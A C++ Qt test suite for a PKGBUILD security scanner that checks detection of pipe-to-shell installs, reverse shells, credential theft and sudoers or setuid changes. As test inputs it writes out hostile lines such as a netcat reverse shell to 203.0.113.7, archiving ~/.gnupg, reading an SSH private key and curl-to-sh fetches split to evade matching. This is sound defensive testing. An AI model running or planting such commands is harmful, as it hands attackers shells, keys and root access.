// SPDX-License-Identifier: GPL-3.0-or-later
#include "pkgscan.hpp"

#include <QDir>
#include <QFile>
#include <QJsonObject>
#include <QTemporaryDir>
#include <QTest>

using namespace Qt::StringLiterals;

using pkgscan::Severity;

namespace {

const auto NO_CHECKSUM = u"no-checksum"_s;
constexpr auto KEY      = "0123456789ABCDEF0123456789ABCDEF01234567"_L1;
const auto KEYS         = u"validpgpkeys=(%1)"_s.arg(KEY);

QString readData(const QString& name) {
    QFile file(QStringLiteral(TEST_DATA_DIR "/") + name);
    if (!file.open(QIODevice::ReadOnly)) {
        qFatal("missing test data %s", qPrintable(name));
    }
    return QString::fromUtf8(file.readAll());
}

QStringList ids(const QList<pkgscan::Finding>& findings) {
    QStringList out;
    for (const auto& finding : findings) {
        out << finding.id;
    }
    return out;
}

int lineOf(const QList<pkgscan::Finding>& findings, const char* id) {
    for (const auto& finding : findings) {
        if (finding.id == QLatin1String(id)) {
            return finding.line;
        }
    }
    return -1;
}

QString recipe(QStringView sources, QStringView extra = {}) {
    return u"pkgname=x\npkgver=1\n%1\n%2\nbuild() {\n  :\n}\n"_s.arg(sources, extra);
}

QString wrap(const QString& body) {
    return QStringLiteral("pkgname=x\npkgver=1\nsource=()\nbuild() {\n%1\n}\n").arg(body);
}

}

class TestPkgscan : public QObject {
    Q_OBJECT

 private slots:
    void cleanPackageHasNoWarnings() {
        const auto analysis = pkgscan::scanPkgbuild(readData(u"clean.PKGBUILD"_s));
        for (const auto& finding : analysis.findings) {
            QVERIFY2(finding.severity == Severity::Info, qPrintable(finding.id + u':' + QString::number(finding.line) + u' ' + finding.excerpt));
        }
        QCOMPARE(analysis.hosts, QStringList{QStringLiteral("github.com")});
        QCOMPARE(analysis.localFiles, (QStringList{QStringLiteral("hello-tool.install"), QStringLiteral("hello-tool.service")}));
    }

    void maliciousPackage() {
        const auto analysis = pkgscan::scanPkgbuild(readData(u"malicious.PKGBUILD"_s));
        const auto found    = ids(analysis.findings);
        for (const char* id : {"top-level-command", "download", "no-checksum", "ip-host", "throwaway-host", "weak-checksum", "vcs-unpinned",
                 "pipe-to-shell", "tls-off", "decode-exec", "eval", "obfuscated-escapes", "credentials", "reverse-shell", "inline-script",
                 "privilege", "system-write", "root-access", "service", "setuid", "autostart", "destructive", "home"}) {
            QVERIFY2(found.contains(QLatin1String(id)), id);
        }
        QCOMPARE(analysis.findings.first().severity, Severity::Danger);
        QCOMPARE(lineOf(analysis.findings, "pipe-to-shell"), 16);
        QCOMPARE(lineOf(analysis.findings, "ip-host"), 8);
        QCOMPARE(lineOf(analysis.findings, "reverse-shell"), 24);
        QCOMPARE(found.count(QStringLiteral("download")), 2);
        QVERIFY(analysis.hosts.contains(QStringLiteral("203.0.113.7")));
    }

    void installScript() {
        const auto findings = pkgscan::scanScript(readData(u"bad.install"_s), QStringLiteral("bad.install"));
        const auto found    = ids(findings);
        QCOMPARE(found.count(QStringLiteral("pipe-to-shell")), 1);
        QCOMPARE(lineOf(findings, "pipe-to-shell"), 3);
        QVERIFY(found.contains(QStringLiteral("service")));
        QVERIFY(found.contains(QStringLiteral("autostart")));
        QVERIFY(found.contains(QStringLiteral("credentials")));
        QVERIFY(found.contains(QStringLiteral("home")));
        QCOMPARE(findings.first().file, QStringLiteral("bad.install"));
    }

    void lineRules_data() {
        QTest::addColumn<QString>("line");
        QTest::addColumn<QString>("expected");

        QTest::newRow("configure flag") << "./configure --prefix=/usr --with-curl --enable-wget" << "";
        QTest::newRow("make install") << "make DESTDIR=\"$pkgdir\" install" << "";
        QTest::newRow("license from system") << "install -Dm644 /usr/share/licenses/common/GPL3/license.txt \"$pkgdir/usr/share/licenses/x/LICENSE\"" << "";
        QTest::newRow("sed prefix") << "sed -i 's|/usr/local|/usr|g' Makefile" << "";
        QTest::newRow("cargo") << "cargo build --release --locked" << "";
        QTest::newRow("mode 755") << "chmod 0755 \"$pkgdir/usr/bin/x\"" << "";
        QTest::newRow("comment") << "# curl https://example.org | sh" << "";
        QTest::newRow("evaluate word") << "echo \"evaluating curl output\"" << "";
        QTest::newRow("home redirected") << "HOME=\"$srcdir\" npm install --cache \"$srcdir/npm\"" << "";
        QTest::newRow("curl in pipe") << "cd src && curl -LO https://example.org/a.zip" << "download";
        QTest::newRow("wget to python") << "wget -qO- https://example.org/a.py | python3" << "pipe-to-shell";
        QTest::newRow("process substitution") << "bash <(curl -s https://example.org/a.sh)" << "pipe-to-shell";
        QTest::newRow("git clone") << "git clone https://example.org/a.git" << "download";
        QTest::newRow("write to etc") << "cp config /etc/app.conf" << "system-write";
        QTest::newRow("redirect to usr") << "echo x > /usr/share/x/y" << "system-write";
        QTest::newRow("setuid symbolic") << "chmod u+s \"$pkgdir/usr/bin/x\"" << "setuid";
        QTest::newRow("netcat") << "nc 203.0.113.7 4444 -e /bin/sh" << "reverse-shell";
        QTest::newRow("gnupg") << "tar czf /tmp/k.tgz ~/.gnupg" << "credentials";
        QTest::newRow("sudoers") << "echo x >> /etc/sudoers" << "root-access";
        QTest::newRow("home") << "cp x \"$HOME/.local/bin/x\"" << "home";
        QTest::newRow("base64 blob") << QStringLiteral("echo %1 > x").arg(QStringLiteral("QmFzZTY0IGJsb2Igd2l0aCBtaXhlZCBjYXNl").repeated(6)) << "encoded-blob";
        QTest::newRow("sha512 is not a blob") << QStringLiteral("echo %1").arg(QStringLiteral("0123456789abcdef").repeated(12)) << "";
    }

    void lineRules() {
        QFETCH(QString, line);
        QFETCH(QString, expected);
        QStringList serious;
        for (const auto& finding : pkgscan::scanPkgbuild(wrap(line)).findings) {
            if (finding.severity != Severity::Info) {
                serious << finding.id;
            }
        }
        if (expected.isEmpty()) {
            QVERIFY2(serious.isEmpty(), qPrintable(serious.join(u',')));
        } else {
            QVERIFY2(serious.contains(expected), qPrintable(serious.join(u',')));
        }
    }

    void codeBehindAssignments_data() {
        QTest::addColumn<QString>("line");

        QTest::newRow("substitution in a quoted array entry") << "values=(\"$(curl https://example.org/p | sh)\")";
        QTest::newRow("command behind an array") << "values=(); curl https://example.org/p | sh";
        QTest::newRow("command behind a scalar") << "pkgdesc=x; curl https://example.org/p | sh";
        QTest::newRow("command behind two scalars") << "a=1 b='x y' && curl https://example.org/p | sh";
    }

    void codeBehindAssignments() {
        QFETCH(QString, line);
        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral("pkgname=x\npkgver=1\n%1\npackage() {\n  :\n}\n").arg(line));
        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("pipe-to-shell")), qPrintable(ids(analysis.findings).join(u' ')));
        QCOMPARE(lineOf(analysis.findings, "pipe-to-shell"), 3);
    }

    void plainAssignmentsAreData() {
        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
            "pkgname=x\npkgdesc=\"Fetch things with curl | sh style installers\"\nurl='https://example.org/?a=1&b=2'\n"
            "_flags=(--with-curl --enable-wget)\nexport LANG=C LC_ALL=C\npackage() {\n  :\n}\n"));
        QVERIFY2(analysis.findings.isEmpty(), qPrintable(ids(analysis.findings).join(u' ')));
    }

    void substitutionInsideBuildPath() {
        const auto analysis = pkgscan::scanPkgbuild(wrap(QStringLiteral("  printf '%s' \"$srcdir/$(<~/.ssh/id_ed25519)\" > dump")));
        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("credentials")), qPrintable(ids(analysis.findings).join(u' ')));
    }

    void commandSplitByContinuation() {
        const auto analysis = pkgscan::scanPkgbuild(wrap(QStringLiteral("  cu\\\nrl https://example.org/p | sh")));
        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("pipe-to-shell")), qPrintable(ids(analysis.findings).join(u' ')));
        const auto link = pkgscan::scanPkgbuild(wrap(QStringLiteral("  ln -s /usr/lib/x \\\n    \"$pkgdir/usr/lib/y\"")));
        QVERIFY2(!ids(link.findings).contains(QStringLiteral("system-write")), qPrintable(ids(link.findings).join(u' ')));
    }

    void everyInstallScriptlet() {
        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
            "pkgbase=x\npkgname=(a b)\npkgver=1\npackage_a() {\n  install=a.install\n}\npackage_b() {\n  install=b.install\n}\n"));
        QCOMPARE(analysis.localFiles, (QStringList{QStringLiteral("a.install"), QStringLiteral("b.install")}));
    }

    void localFileThatIsRun() {
        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
            "pkgname=x\npkgver=1\nsource=(payload notes fix.patch)\nsha256sums=(a b c)\nbuild() {\n  bash payload\n  patch -p1 < fix.patch\n}\n"));
        QCOMPARE(analysis.localFiles, QStringList{QStringLiteral("payload")});
        QCOMPARE(analysis.otherLocalFiles, (QStringList{QStringLiteral("notes"), QStringLiteral("fix.patch")}));

        for (const auto* build : {"  bash \\\n      payload\n", "  ba\\\nsh payload\n"}) {
            const auto split = pkgscan::scanPkgbuild(
                QStringLiteral("pkgname=x\npkgver=1\nsource=(payload)\nsha256sums=(a)\nbuild() {\n%1}\n").arg(QLatin1String(build)));
            QCOMPARE(split.localFiles, QStringList{QStringLiteral("payload")});
        }
    }

    void signatures() {
        const auto renamed = pkgscan::scanPkgbuild(recipe(u"source=(\"payload.sh::https://example.org/payload.sig\")\nsha256sums=(SKIP)"));
        QVERIFY(ids(renamed.findings).contains(NO_CHECKSUM));

        const auto pair = u"source=(https://example.org/x-1.tar.gz https://example.org/x-1.tar.gz.sig)\nsha256sums=(SKIP SKIP)"_s;
        const auto withKeys = pkgscan::scanPkgbuild(recipe(pair, KEYS));
        QVERIFY2(!ids(withKeys.findings).contains(NO_CHECKSUM), qPrintable(ids(withKeys.findings).join(u' ')));
        QCOMPARE(ids(pkgscan::scanPkgbuild(recipe(pair)).findings).count(NO_CHECKSUM), 1);

        const auto query = pkgscan::scanPkgbuild(recipe(u"source=(https://example.org/payload 'https://example.org/payload.sig?download=1')\nsha256sums=(SKIP SKIP)", KEYS));
        QCOMPARE(ids(query.findings).count(NO_CHECKSUM), 2);

        const auto otherArch = pkgscan::scanPkgbuild(recipe(
            u"source=(https://example.org/payload)\nsha256sums=(SKIP)\nsource_aarch64=(https://example.org/payload.sig)\nsha256sums_aarch64=(SKIP)", KEYS));
        QCOMPARE(ids(otherArch.findings).count(NO_CHECKSUM), 1);
        const auto common = pkgscan::scanPkgbuild(recipe(
            u"source=(https://example.org/payload.sig)\nsha256sums=(SKIP)\nsource_x86_64=(https://example.org/payload)\nsha256sums_x86_64=(SKIP)", KEYS));
        QVERIFY2(!ids(common.findings).contains(NO_CHECKSUM), qPrintable(ids(common.findings).join(u' ')));

        const auto packed = pkgscan::scanPkgbuild(recipe(u"source=(https://example.org/x.tar.xz https://example.org/x.tar.sign)\nsha256sums=(SKIP SKIP)", KEYS));
        QVERIFY2(!ids(packed.findings).contains(NO_CHECKSUM), qPrintable(ids(packed.findings).join(u' ')));
    }

    void braceExpansion() {
        const auto pkgbuild = recipe(u"source=(https://example.org/x-1.tar.gz{,.sig})\nsha256sums=(SKIP SKIP)", KEYS);
        const auto srcinfo  = u"pkgbase = x\n\tsource = https://example.org/x-1.tar.gz\n\tsource = https://example.org/x-1.tar.gz.sig\n"
                              "\tsha256sums = SKIP\n\tsha256sums = SKIP\n\tvalidpgpkeys = %1\n"_s.arg(KEY);
        const auto listed   = pkgscan::scanPkgbuild(pkgbuild, srcinfo);
        QVERIFY2(listed.findings.isEmpty(), qPrintable(ids(listed.findings).join(u' ')));

        const auto bare = pkgscan::scanPkgbuild(pkgbuild);
        QEXPECT_FAIL("", "brace expansion is only known from .SRCINFO", Continue);
        QVERIFY(!ids(bare.findings).contains(NO_CHECKSUM));
    }

    void srcinfoGivesTheSameResult_data() {
        QTest::addColumn<QString>("name");
        QTest::newRow("clean") << u"clean"_s;
        QTest::newRow("malicious") << u"malicious"_s;
    }

    void srcinfoGivesTheSameResult() {
        QFETCH(QString, name);
        const auto pkgbuild = readData(name + u".PKGBUILD");
        const auto bare     = pkgscan::scanPkgbuild(pkgbuild);
        const auto listed   = pkgscan::scanPkgbuild(pkgbuild, readData(name + u".SRCINFO"));
        QCOMPARE(listed.findings.size(), bare.findings.size());
        for (qsizetype i = 0; i < bare.findings.size(); ++i) {
            QCOMPARE(listed.findings.at(i).id, bare.findings.at(i).id);
            QCOMPARE(listed.findings.at(i).line, bare.findings.at(i).line);
            QCOMPARE(listed.findings.at(i).excerpt, bare.findings.at(i).excerpt);
        }
        QCOMPARE(listed.hosts, bare.hosts);
        QCOMPARE(listed.localFiles, bare.localFiles);
        QCOMPARE(listed.otherLocalFiles, bare.otherLocalFiles);
    }

    void srcinfoMismatch() {
        const auto pkgbuild = recipe(u"source=(https://example.org/a \"https://example.org/$_dir/b\")\nsha256sums=(0 0)\ninstall=\"${pkgname%-git}.install\"");
        const auto srcinfo  = u"pkgbase = x\n\tinstall = x.install\n\tsource = https://example.net/c\n\tsource = https://example.org/d/b\n\tsha256sums = 0\n\tsha256sums = 0\n"_s;
        const auto analysis = pkgscan::scanPkgbuild(pkgbuild, srcinfo);
        QCOMPARE(ids(analysis.findings), QStringList{u"srcinfo-mismatch"_s});
        QCOMPARE(analysis.findings.first().line, 3);
        QCOMPARE(analysis.findings.first().excerpt, u"https://example.org/a"_s);
        QCOMPARE(analysis.hosts, QStringList{u"example.org"_s});
        QCOMPARE(analysis.localFiles, QStringList{u"x.install"_s});
        QVERIFY(pkgscan::scanPkgbuild(pkgbuild).localFiles.isEmpty());
    }

    void collectFiles() {
        QTemporaryDir dir;
        QVERIFY(dir.isValid());
        const auto write = [&](const QString& name, const QByteArray& text) {
            QFile file(dir.filePath(name));
            QVERIFY(file.open(QIODevice::WriteOnly));
            file.write(text);
        };
        write(u"a.install"_s, "post_install() { :; }\n");
        write(u"b.sh"_s, "true\n");
        write(u"payload"_s, "#!/bin/sh\ncurl https://example.org/p | sh\n");
        write(u"notes"_s, "text\n");
        QVERIFY(QFile::link(dir.filePath(u"payload"_s), dir.filePath(u"link"_s)));

        pkgscan::Analysis analysis;
        analysis.localFiles      = {u"a.install"_s, u"b.sh"_s, u"missing.sh"_s};
        analysis.otherLocalFiles = {u"payload"_s, u"notes"_s, u"link"_s};
        const auto files         = pkgscan::collectFiles(QDir(dir.path()), analysis, 3);
        QCOMPARE(analysis.localFiles, (QStringList{u"a.install"_s, u"b.sh"_s, u"missing.sh"_s, u"payload"_s}));
        QCOMPARE(files.files.size(), 2);
        QCOMPARE(files.files.first().name, u"a.install"_s);
        QCOMPARE(files.unreadable, (QStringList{u"payload"_s, u"missing.sh"_s}));
    }

    void names() {
        QVERIFY(pkgscan::validPkgbase(u"python-foo+bar_2.0@x"));
        for (const auto* name : {"", ".hidden", "-flag", "Upper", "a/b", "a b"}) {
            QVERIFY2(!pkgscan::validPkgbase(QString::fromLatin1(name)), name);
        }
        QVERIFY(!pkgscan::validPkgbase(QString(129, u'a')));

        const pkgscan::Finding finding{u"eval"_s, Severity::Warning, u"PKGBUILD"_s, 3, u"t"_s, u"d"_s, u"e"_s};
        const auto json = pkgscan::toJson(finding);
        QCOMPARE(json.value("severity"_L1).toString(), u"warning"_s);
        QCOMPARE(json.value("line"_L1).toInt(), 3);
        QCOMPARE(pkgscan::severityName(Severity::Danger), u"danger"_s);
    }

    void metadata() {
        const auto now = QDateTime::fromSecsSinceEpoch(2'000'000'000);
        pkgscan::Metadata meta{QStringLiteral("x"), QStringLiteral("alice"), QStringLiteral("alice"), 120, 2.0, 1'900'000'000, 1'990'000'000};
        QVERIFY(pkgscan::scanMetadata(meta, now).isEmpty());

        meta.maintainer.clear();
        QVERIFY(ids(pkgscan::scanMetadata(meta, now)).contains(QStringLiteral("orphaned")));

        meta.maintainer     = QStringLiteral("mallory");
        meta.lastModified   = 2'000'000'000 - 3600;
        meta.votes          = 0;
        meta.popularity     = 0;
        auto found          = ids(pkgscan::scanMetadata(meta, now));
        QCOMPARE(found, (QStringList{QStringLiteral("adopted"), QStringLiteral("recent-change"), QStringLiteral("few-users")}));

        meta.firstSubmitted = 2'000'000'000 - 5 * 86400;
        found               = ids(pkgscan::scanMetadata(meta, now));
        QVERIFY(found.contains(QStringLiteral("new-package")));
        QVERIFY(!found.contains(QStringLiteral("recent-change")));
    }

    void similarNames() {
        const QStringList known{QStringLiteral("firefox"), QStringLiteral("discord"), QStringLiteral("gtk3"), QStringLiteral("python-requests"), QStringLiteral("vlc")};
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefoxx-bin"), known), QStringLiteral("firefox"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("dicsord"), known), QStringLiteral("discord"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("python-request"), known), QStringLiteral("python-requests"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox-bin"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("gtk4x"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("vlcc"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("spotify"), known), QString());
    }

    void srcinfoVersions() {
        QCOMPARE(pkgscan::srcinfoVersion(u"pkgbase = pfetch\n\tpkgdesc = x\n\tpkgver = 1.11.0\n\tpkgrel = 1\n\npkgname = pfetch\n"_s), u"1.11.0-1"_s);
        QCOMPARE(pkgscan::srcinfoVersion(u"pkgbase = a\n\tpkgver = 2.0\n\tpkgrel = 3\n\tepoch = 1\n"_s), u"1:2.0-3"_s);
        QCOMPARE(pkgscan::srcinfoVersion(u"pkgbase = a\n\tpkgver = 2.0\n\tpkgrel = 3\n\tepoch = 0\n"_s), u"2.0-3"_s);
        // a split package does not change the version of the base
        QCOMPARE(pkgscan::srcinfoVersion(u"pkgbase = a\n\tpkgver = 2.0\n\tpkgrel = 1\n\npkgname = a-doc\n\tpkgver = 9\n"_s), u"2.0-1"_s);
        QCOMPARE(pkgscan::srcinfoVersion(u"pkgbase = a\n\tpkgrel = 1\n"_s), QString());
        QCOMPARE(pkgscan::srcinfoVersion(QString()), QString());
    }

    void catFileContents() {
        const auto output = "aaa blob 5\nhello\nbbb missing\nccc blob 0\n\nddd blob 3\nx\ny\n"_ba;
        const auto contents = pkgscan::catFileContents(output);
        QCOMPARE(contents.size(), 4);
        QCOMPARE(contents.at(0), "hello"_ba);
        QVERIFY(contents.at(1).isEmpty());
        QVERIFY(contents.at(2).isEmpty());
        QCOMPARE(contents.at(3), "x\ny"_ba);
        // a size beyond the end is not trusted
        QCOMPARE(pkgscan::catFileContents("aaa blob 99\nshort\n"_ba).value(0), QByteArrayView());
    }

    void readableDiffs() {
        const auto diff = u"diff --git a/PKGBUILD b/PKGBUILD\n"
                          "index 1111111..2222222 100644\n"
                          "--- a/PKGBUILD\n"
                          "+++ b/PKGBUILD\n"
                          "@@ -1,3 +1,3 @@\n"
                          " pkgname=a\n"
                          "-pkgver=1\n"
                          "+pkgver=2\n"
                          "diff --git a/a.install b/a.install\n"
                          "new file mode 100644\n"
                          "index 0000000..3333333\n"
                          "--- /dev/null\n"
                          "+++ b/a.install\n"
                          "@@ -0,0 +1 @@\n"
                          "+post_install() { :; }\n"
                          "diff --git a/old.patch b/old.patch\n"
                          "deleted file mode 100644\n"
                          "index 4444444..0000000\n"
                          "--- a/old.patch\n"
                          "+++ /dev/null\n"
                          "@@ -1 +0,0 @@\n"
                          "--- a/x\n"
                          "diff --git a/logo.png b/logo.png\n"
                          "index 5555555..6666666 100644\n"
                          "Binary files a/logo.png and b/logo.png differ\n"
                          "diff --git a/run.sh b/run.sh\n"
                          "old mode 100644\n"
                          "new mode 100755\n"_s;
        const auto changes = pkgscan::readableDiff(diff);
        // a removed line that looks like a header stays what it is
        QCOMPARE(changes.split(u'\n'), (QStringList{u"PKGBUILD"_s, u"@@ -1,3 +1,3 @@"_s, u" pkgname=a"_s, u"-pkgver=1"_s,
                                                u"+pkgver=2"_s, u"a.install (new file)"_s, u"@@ -0,0 +1 @@"_s, u"+post_install() { :; }"_s,
                                                u"old.patch (removed)"_s, u"@@ -1 +0,0 @@"_s, u"--- a/x"_s, u"logo.png"_s,
                                                u"\\ binary file, not shown"_s, u"run.sh (mode changed)"_s}));
        QCOMPARE(pkgscan::readableDiff(QString()), QString());
    }
};

QTEST_APPLESS_MAIN(TestPkgscan)
#include "test_pkgscan.moc"
